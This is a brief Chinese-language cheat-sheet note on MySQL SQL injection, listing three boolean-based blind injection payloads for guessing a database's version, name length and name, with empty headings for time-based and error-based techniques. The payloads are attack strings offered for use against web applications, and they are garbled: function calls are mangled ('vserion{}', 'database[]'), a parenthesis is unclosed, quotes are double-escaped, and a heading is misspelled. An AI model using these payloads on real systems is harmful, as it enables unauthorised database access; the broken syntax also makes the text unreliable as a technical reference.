### SQL inject Mysql {#sql-inject-mysql}

盲注：

1.boolenBased

1.1\.        1&amp;apos; and 1=1 and left(vserion{},1)=5 and &amp;apos;1&amp;apos;=&amp;apos;1        #数据库版本猜解

1.2\.        1&amp;apos; and 1=1 and length(database[])=4 and &amp;apos;1&amp;apos;=&amp;apos;1     #数据库名的长度猜解

1.3\.        1&amp;apos; and 1=1 and left(database[],1=&amp;apos;a&amp;apos; and &amp;apos;1&amp;apos;=&amp;apos;1       #数据库名猜解

2.timeBased

3.ErrotBased